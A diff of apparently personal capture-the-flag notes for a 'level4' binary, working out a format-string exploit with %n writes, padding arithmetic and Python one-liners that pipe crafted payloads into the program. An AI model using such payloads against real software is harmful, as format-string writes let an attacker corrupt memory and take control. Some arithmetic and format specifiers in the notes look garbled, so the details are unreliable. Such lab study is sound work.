@@ -25,23 +25,8 @@ value 2: `0x0001 0102` = `258` at `m + 2`
 
 YYYY YYY1 | 0102 5544 | ZZZZ ZZZZ
 
-10102
 
-21828 - 8 = 21820
-258 - 21828 = 50121
-
-address + adress + 2
-
-`%.$value.`: put nb of paddings (whitespace) equal to value
-
-%12?
-6 ?
-
-```
-(python -c 'print ("\x10\x98\x04\x08" + "AAAAAAA" + "%12$n")'; cat) | ./level4
-```
-
-\x10\x98\x04\x08%42d%12$n
+`%VALUEd$`: put nb of paddings (whitespace) equal to VALUE
 
 ```python
 exploit = ""
@@ -53,16 +38,9 @@ exploit += "%?$43966x"			//paddding to get to value 2 (65794 - 21820 - 8 = 43966
 exploit += "%? + 1 $n"			//write cible2
 ```
 
-`\x10\x98\x04\x08\x12\x98\x04\x08%12$n%12$21820x%12$n%12$43966x%13$n`
 
 ```bash
 (python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")'; cat) | ./level4
-```
-
-(python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")';) | ./level4
-
-```bash
-(python -c 'print ("A" * 8 + "%12$s")'; cat) | ./level4
 ```
 
 \x10\x98\x04\x08%10$n
